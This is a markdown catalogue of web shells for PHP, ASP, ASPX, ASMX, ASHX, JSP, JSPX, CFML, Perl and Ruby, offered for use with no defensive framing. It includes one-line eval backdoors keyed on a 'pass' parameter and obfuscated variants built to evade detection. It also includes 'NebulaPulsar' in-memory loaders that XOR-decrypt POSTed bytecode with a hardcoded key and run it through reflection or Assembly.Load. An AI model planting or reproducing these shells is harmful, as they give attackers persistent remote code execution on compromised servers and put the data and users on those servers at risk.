# PHP

`pass`
```PHP
<?php @eval($_POST['pass');?>
```
`-7`
```php
<?php
@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?>
```

# ASP

`pass`
```ASP
<%eval request("pass")%>
```
`-7`
```asp
<%eval""&(“e”&“v”&“a”&“l”&"("&“r”&“e”&“q”&“u”&“e”&“s”&“t”&"("&“0”&"-"&“2”&"-"&“5”&")"&")")%>
```
`pass`
```asp
<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("pass"))%>
```

# .NET
## ASPX(JScript)

`pass`
```ASPX
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
```
`-7`
```aspx
<%@ Page Language = Jscript %>
<%var/-/-/P/-/-/=/-/-/“e”+“v”+/-/-/
“a”+“l”+"("+“R”+“e”+/-/-/“q”+“u”+“e”/-/-/+“s”+“t”+
“[/-/-/0/-/-/-/-/-/2/-/-/-/-/-/5/-/-/]”+
“,”+"""+“u”+“n”+“s”/-/-/+“a”+“f”+“e”+"""+")";eval
(/-/-/P/-/-/,/-/-/“u”+“n”+“s”/-/-/+“a”+“f”+“e”/-/-/);%>
```

## ASPX(C#)

```C#
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.HttpMethod == "POST")
        {
            try
            {
                int totalBytes = Request.TotalBytes;
                if (totalBytes <= 0)
                    return;
                
                byte[] rawData = Request.BinaryRead(totalBytes);

                object loader = Session["nebulapulsar"];
                if (loader == null)
                {
                    byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes("NBPULSARDEADBEEF");
                    for (int i = 0; i < rawData.Length; i++)
                        rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);

                    Assembly asm = Assembly.Load(rawData);
                    loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
                    Session["nebulapulsar"] = loader;
                    Response.Write("LOADER_INIT_SUCCESS");
                }
                else
                {
                    Context.Items["rawPostData"] = rawData;
                    loader.GetType().GetMethod("Equals", new Type[]{typeof(object)}).Invoke(loader, new object[]{Context});
                }
            }
            catch (Exception ex)
            {
                Response.Write("ASPX_PORT_ERROR: " + ex.Message);
            }
        }
    }
</script>
```

## ASMX

### JScript

```
<%@ WebService Language="JScript" class="ScriptMethodSpy"%>
import System;
import System.Web;
import System.IO;
import System.Web.Services
import System.Web.Script.Services

public class ScriptMethodSpy extends WebService
{
    WebMethodAttribute ScriptMethodAttribute function Invoke(pass : String) : Void
    {
        var I = HttpContext.Current;
        var Request = I.Request;
        var Response = I.Response;
        var Server = I.Server;
        
        eval(pass);
    }
}
```

`web.config`
```xml
<configuration>
    <system.web>
        <webServices>
            <protocols>
                <add name="HttpGet"/>
                <add name="HttpPost"/>
            </protocols>
        </webServices>
        <customErrors mode="Off" />
    </system.web>
    <system.webServer>
        <directoryBrowse enabled="true" />
    </system.webServer>
</configuration>
```

---

### .NET
```C#
<%@ WebService Language="C#" Class="ScriptMethodSpy" %>

using System;
using System.Web;
using System.Web.Services;
using System.Reflection;

[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class ScriptMethodSpy : System.Web.Services.WebService
{
    [WebMethod]
    public void Invoke(string pass)
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return;

        if (context.Request.HttpMethod != "POST" || string.IsNullOrEmpty(context.Request.Form["pass"]))
        {
            context.Response.Clear();
            context.Response.ContentType = "text/html";
            context.Response.Write("");
            context.Response.Flush();
            context.ApplicationInstance.CompleteRequest();
            return;
        }

        try
        {
            byte[] dllBytes = Convert.FromBase64String(pass.Trim());
            Assembly assembly = Assembly.Load(dllBytes);

            Type targetType = null;
            foreach (Type t in assembly.GetTypes())
            {
                if (t.Name == "Cmd")
                {
                    targetType = t;
                    break;
                }
            }

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                instance.Equals(null);
            }
        }
        catch (Exception)
        {
            context.Response.Clear();
            context.ApplicationInstance.CompleteRequest();
        }
    }
}
```

---

## ASHX

### JScript
```C#
<%@ WebHandler Language=”JScript” class=”AsyncHandlerSpy”%>
import System;
import System.Web;
import System.IO;

public class AsyncHandlerSpy implements IHttpAsyncHandler
{
    function IHttpAsyncHandler.BeginProcessRequest(context : HttpContext,asyncCallback :AsyncCallback , obj : Object ) : IAsyncResult
    {
        eval(context.Request[“pass”]);
        HttpContext.Current.Response.End();
    }

    function IHttpAsyncHandler.EndProcessRequest(result : IAsyncResult){}
    
    function IHttpHandler.ProcessRequest(context : HttpContext){}
    
    function get IHttpHandler.IsReusable() : Boolean{return false;}
}
```

### .NET
```C#
<%@ WebHandler Language="C#" Class="backdoor" %>

using System;
using System.Web;
using System.Reflection;

public class backdoor : IHttpHandler 
{
    public void ProcessRequest(HttpContext context) 
    {
        if (context.Request.HttpMethod == "POST")
        {
            try
            {
                string passData = context.Request.Form["pass"];

                if (!string.IsNullOrEmpty(passData))
                {
                    byte[] dllBytes = Convert.FromBase64String(passData.Trim());

                    Assembly assembly = Assembly.Load(dllBytes);

                    Type targetType = null;
                    foreach (Type t in assembly.GetTypes())
                    {
                        if (t.Name == "Cmd") { targetType = t; break; }
                    }

                    if (targetType != null)
                    {
                        object instance = Activator.CreateInstance(targetType);
                        instance.Equals(null);
                    }
                }
            }
            catch (Exception ex)
            {
                context.Response.Write("ASHX Error: " + ex.Message);
            }
        }
    }
 
    public bool IsReusable {
        get { return true; }
    }
}
```

# Java
## JSP

Nashorn:
```JSP
<%@ page import="javax.script.*" %>
<%
    if (request.getMethod().equals("POST")) {
        String code = request.getParameter("pass");
        if (code != null) {
            ScriptEngineManager manager = new ScriptEngineManager();
            ScriptEngine engine = manager.getEngineByName("js");
            
            engine.put("response", response); 
            engine.put("request", request);
            
            try {
                engine.eval(code);
            } catch (Exception e) {
                response.getWriter().println("Engine Error: " + e.getMessage());
            }
        }
    }
%>
```

---

NebulaPulsar:
```Java
<%@page import="java.util.*,java.io.*,java.lang.reflect.*" %>

<%!
private byte[] decryptPayload(byte[] data, String keyStr) {
    if (data == null || data.length == 0 || keyStr == null) {
        return new byte[0];
    }
    
    byte[] decrypted = new byte[data.length];
    byte[] keyBytes = keyStr.getBytes();
    int keyLength = keyBytes.length;
    
    for (int i = 0; i < data.length; i++)
        decrypted[i] = (byte) (data[i] ^ keyBytes[(i + 1) % keyLength]);
    
    return decrypted;
}
%>

<%
if (request.getMethod().equals("POST")) {
    Object loader = session.getAttribute("pulsar_loader");
    
    if (loader == null) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[512];
        int length = request.getInputStream().read(buf);
        while (length > 0) { 
            bos.write(buf, 0, length); 
            length = request.getInputStream().read(buf); 
        }
        byte[] encryptedData = bos.toByteArray();
        
        String key = "NBPULSARDEADBEEF";
        byte[] data = decryptPayload(encryptedData, key);
        
        try {
            ClassLoader parentLoader = this.getClass().getClassLoader();
            ClassLoader sandboxLoader = new ClassLoader(parentLoader) {};
            
            Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineMethod.setAccessible(true);
            
            Class<?> clazz = (Class<?>) defineMethod.invoke(sandboxLoader, data, 0, data.length);
            
            Constructor<?> constructor = clazz.getConstructor(ClassLoader.class);
            loader = constructor.newInstance(sandboxLoader);
            
            session.setAttribute("pulsar_loader", loader);
            out.print("LOADER_INIT_SUCCESS");
        } catch (InvocationTargetException ite) {
            Throwable cause = ite.getTargetException();
            if (cause instanceof java.lang.LinkageError && cause.getMessage().contains("duplicate class definition")) {
                out.print("LOADER_ALREADY_EXISTS_RESPONSE");
            } else {
                out.print("LOADER_FAILED_REAL_CAUSE: " + cause.toString());
            }
        } catch (Exception e) {
            out.print("LOADER_FAILED: " + e.toString());
        }
    } else {
        try {
            loader.getClass().getMethod("equals", Object.class).invoke(loader, pageContext);
        } catch (Exception e) {
            out.print("EXEC_FAILED: " + e.toString());
        }
    }
}
%>
```

## JSPX

Nashorn:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
    <jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" import="javax.script.*" />
    
    <jsp:scriptlet>
        <![CDATA[
        if (request.getMethod().equals("POST")) {
            String code = request.getParameter("pass");
            if (code != null) {
                ScriptEngineManager manager = new ScriptEngineManager();
                ScriptEngine engine = manager.getEngineByName("js");
                
                engine.put("response", response); 
                engine.put("request", request);
                
                try {
                    engine.eval(code);
                } catch (Exception e) {
                    response.getWriter().println("Engine Error: " + e.getMessage());
                }
            }
        }
        ]]>
    </jsp:scriptlet>
</jsp:root>
```

---

NebulaPulsar:
```xml
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0" xmlns:c="http://java.sun.com/jsp/jstl/core">
    <jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" />
    <jsp:directive.page import="java.util.*,java.io.*,java.lang.reflect.*" />

    <jsp:declaration>
    <![CDATA[
    private byte[] decryptPayload(byte[] abData, String szKeyStr) {
        if (abData == null || abData.length == 0 || szKeyStr == null) {
            return new byte[0];
        }
        
        byte[] abDecrypted = new byte[abData.length];
        byte[] abKeyBytes = szKeyStr.getBytes();
        int nKeyLength = abKeyBytes.length;
        
        for (int nI = 0; nI < abData.length; nI++)
            abDecrypted[nI] = (byte) (abData[nI] ^ abKeyBytes[(nI + 1) % nKeyLength]);
        
        return abDecrypted;
    }
    ]]>
    </jsp:declaration>

    <jsp:scriptlet>
    <![CDATA[
    if (request.getMethod().equals("POST"))
    {
        Object objLoader = session.getAttribute("pulsar_loader");
        
        if (objLoader == null) {
            ByteArrayOutputStream bosBuffer = new ByteArrayOutputStream();
            byte[] abChunk = new byte[512];
            int nLength = request.getInputStream().read(abChunk);
            while (nLength > 0)
            { 
                bosBuffer.write(abChunk, 0, nLength); 
                nLength = request.getInputStream().read(abChunk); 
            }
            
            byte[] abEncryptedData = bosBuffer.toByteArray();
            
            String szKey = "NBPULSARDEADBEEF";
            byte[] abData = decryptPayload(abEncryptedData, szKey);
            
            try
            {
                ClassLoader objParentLoader = this.getClass().getClassLoader();
                ClassLoader objSandboxLoader = new ClassLoader(objParentLoader) {};
                
                Method fnDefineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                fnDefineMethod.setAccessible(true);
                
                Class<?> clazzTarget = (Class<?>) fnDefineMethod.invoke(objSandboxLoader, abData, 0, abData.length);
                
                Constructor<?> objConstructor = clazzTarget.getConstructor(ClassLoader.class);
                objLoader = objConstructor.newInstance(objSandboxLoader);
                
                session.setAttribute("pulsar_loader", objLoader);
                out.print("LOADER_INIT_SUCCESS");
            }
            catch (InvocationTargetException ex)
            {
                Throwable th = ex.getTargetException();
                if (th instanceof java.lang.LinkageError && th.getMessage().contains("duplicate class definition"))
                {
                    out.print("LOADER_ALREADY_EXISTS_RESPONSE");
                }
                else
                {
                    out.print("LOADER_FAILED_REAL_CAUSE: " + th.toString());
                }
            } catch (Exception ex)
            {
                out.print("LOADER_FAILED: " + ex.toString());
            }
        }
        else
        {
            try
            {
                objLoader.getClass().getMethod("equals", Object.class).invoke(objLoader, pageContext);
            }
            catch (Exception ex)
            {
                out.print("EXEC_FAILED: " + ex.toString());
            }
        }
    }
    ]]>
    </jsp:scriptlet>
</jsp:root>
```

---

## CFML

NebulaPulsar
```java
<cfif isDefined("CGI.REQUEST_METHOD") AND CGI.REQUEST_METHOD EQ "POST">
<cfscript>
try
{
    loader = structKeyExists(Session, "pulsar_loader") ? Session.pulsar_loader : "";
    if (NOT isObject(loader))
    {
        // HttpServletRequest, read POST payload (raw body)
        page_context = getPageContext();
        req = page_context.getRequest();
        input_stream = req.getInputStream();

        bos = CreateObject("java", "java.io.ByteArrayOutputStream").init();
        reflect_array = CreateObject("java", "java.lang.reflect.Array");
        byte_class = CreateObject("java", "java.lang.Byte").TYPE;
        buffer = reflect_array.newInstance(byte_class, JavaCast("int", 512));

        length = input_stream.read(buffer);
        while (length GT 0)
        {
            bos.write(buffer, JavaCast("int", 0), JavaCast("int", length));
            length = input_stream.read(buffer);
        }

        encrypted_data = bos.toByteArray();
        data_length = reflect_array.getLength(encrypted_data);

        // XOR decryption
        if (data_length GT 0)
        {
            key_str = "NBPULSARDEADBEEF";
            key_bytes = key_str.getBytes();
            key_length = reflect_array.getLength(key_bytes);

            decrypted_data = reflect_array.newInstance(byte_class, JavaCast("int", data_length));
            for (i = 0; i < data_length; i++)
            {
                data_byte = reflect_array.getByte(encrypted_data, JavaCast("int", i));
                key_byte = reflect_array.getByte(key_bytes, JavaCast("int", (i + 1) % key_length));

                decrypted_byte = bitXor(JavaCast("int", data_byte), JavaCast("int", key_byte));
                reflect_array.setByte(decrypted_data, JavaCast("int", i), JavaCast("byte", decrypted_byte));
            }

            parent_loader = page_context.getClass().getClassLoader();
            url_class = CreateObject("java", "java.lang.Class").forName("java.net.URL");
            url_array = reflect_array.newInstance(url_class, JavaCast("int", 0));

            sandbox_loader = CreateObject("java", "java.net.URLClassLoader").init(url_array, parent_loader);
            class_loader = CreateObject("java", "java.lang.Class").forName("java.lang.ClassLoader");
            string_class = CreateObject("java", "java.lang.Class").forName("java.lang.String");

            params = [
                string_class,
                decrypted_data.getClass(),
                CreateObject("java", "java.lang.Integer").TYPE,
                CreateObject("java", "java.lang.Integer").TYPE
            ];

            define_method = class_loader.getDeclaredMethod("defineClass", params);
            define_method.setAccessible(true);

            obj_class = CreateObject("java", "java.lang.Class").forName("java.lang.Object");
            java_args = reflect_array.newInstance(obj_class, JavaCast("int", 4));

            reflect_array.set(java_args, JavaCast("int", 0), JavaCast("null", ""));
            reflect_array.set(java_args, JavaCast("int", 1), decrypted_data);
            reflect_array.set(java_args, JavaCast("int", 2), JavaCast("int", 0));
            reflect_array.set(java_args, JavaCast("int", 3), JavaCast("int", data_length));

            clazz = define_method.invoke(sandbox_loader, java_args);
                
            constructor_types = reflect_array.newInstance(CreateObject("java", "java.lang.Class").forName("java.lang.Class"), JavaCast("int", 1));
            reflect_array.set(constructor_types, JavaCast("int", 0), class_loader);
            constructor = clazz.getConstructor(constructor_types);
            
            constructor_args = reflect_array.newInstance(obj_class, JavaCast("int", 1));
            reflect_array.set(constructor_args, JavaCast("int", 0), sandbox_loader);
            loader = constructor.newInstance(constructor_args);
            
            Session.pulsar_loader = loader;

            WriteOutput("LOADER_INIT_SUCCESS");
        }
        else
        {
            WriteOutput("LOADER_FAILED: Empty payload received.");
        }
    }
    else
    {
        loader.equals(getPageContext());
    }
}
catch (any e)
{
    ex = structKeyExists(e, "Cause") ? e.Cause.toString() : e.message;
    if (findNoCase("duplicate class definition", ex))
    {
        WriteOutput("LOADER_ALREADY_EXISTS_RESPONSE");
    }
    else
    {
        WriteOutput("LOADER_FAILED: " & e.message & " | Detail: " & (structKeyExists(e, "Detail") ? e.Detail : ""));
    }
}
</cfscript>
</cfif>
```
 
# Perl

```Perl
use CGI;eval(CGI->new->param('pass'));
```

# Ruby

Recommanded:

```Ruby
require 'uri'; $_POST = URI.decode_www_form(STDIN.read(ENV['CONTENT_LENGTH'].to_i)).to_h rescue {}; eval($_POST['pass']) if $_POST['pass']
```

---

No recommanded:
```Ruby
STDIN.read(ENV['CONTENT_LENGTH'].to_i).to_s =~ /pass=([^&]+)/; eval($1.gsub('+',' ').gsub(/%([a-fA-F0-9]{2})/){[$1.hex].pack('C')}) if $1
```



# References
- https://github.com/tennc/webshell
- https://www.anquanke.com/post/id/152238
- https://www.anquanke.com/post/id/151960
